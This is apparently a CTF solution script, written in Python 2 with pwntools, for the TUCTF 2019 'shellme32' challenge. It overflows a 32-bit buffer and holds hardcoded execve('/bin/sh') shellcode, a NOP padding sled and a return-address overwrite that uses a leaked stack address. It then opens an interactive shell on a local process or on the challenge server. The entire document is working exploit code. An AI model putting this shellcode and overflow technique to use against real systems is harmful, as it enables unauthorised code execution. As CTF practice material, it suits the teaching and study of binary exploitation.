#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
context.update(arch="i386", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/tuCTF-2019/pwn/shellme32/shellme32")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    #attach(r)
    
    sh = ''
    sh += "\x31\xc0\x50\x68\x2f\x2f\x73"
    sh += "\x68\x68\x2f\x62\x69\x6e\x89"
    sh += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
    sh += "\xcd\x80\x31\xc0\x40\xcd\x80"

    r.recvuntil("shellcode?\n")
    addr = int(r.recv(10),16)
    p = sh + ("\x90" * (40 - len(sh))) 
    p += p32(addr)
    print hex(addr)
    print(p)
    print len(p)
    r.sendline(p)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("chal.tuctf.com", 30506)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
